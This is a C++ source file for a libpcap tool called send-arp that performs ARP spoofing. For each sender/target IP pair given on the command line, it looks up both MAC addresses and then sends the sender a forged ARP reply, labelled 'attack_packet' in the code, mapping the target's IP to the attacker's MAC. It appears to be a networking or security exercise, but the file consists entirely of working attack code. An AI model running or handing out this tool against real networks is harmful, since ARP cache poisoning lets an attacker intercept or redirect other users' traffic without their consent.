#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "custom.h"

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	int count = (argc - 1) / 2;

	for (int i = 0; i < count; i++) {
		const char* dev = argv[1];
		const char* sender_ip = argv[2 * (i + 1)];
		const char* target_ip = argv[2 * (i + 1) + 1];

		uint8_t source_mac[MAC_ALEN];
		char source_ip[40];
		if (get_source_info(dev, source_mac, source_ip) == -1) {
			return -1;
		}

		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		Mac sender_mac, target_mac;
		int status;

		status = get_mac_adress(handle, &sender_mac, Mac("ff:ff:ff:ff:ff:ff"),
									source_mac, htons(ArpHdr::Request), source_mac, htonl(Ip(source_ip)),
									Mac("00:00:00:00:00:00"), htonl(Ip(sender_ip)));
		if (status == -1) {
			return -1;
		}

		status = get_mac_adress(handle, &target_mac, Mac("ff:ff:ff:ff:ff:ff"),
									source_mac, htons(ArpHdr::Request), source_mac, htonl(Ip(source_ip)),
									Mac("00:00:00:00:00:00"), htonl(Ip(target_ip)));
		if (status == -1) {
			return -1;
		}

		EthArpPacket attack_packet;
		config_packet(&attack_packet, sender_mac, source_mac, htons(ArpHdr::Reply), source_mac, htonl(Ip(target_ip)), sender_mac, htonl(Ip(sender_ip)));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		pcap_close(handle);
	}
}
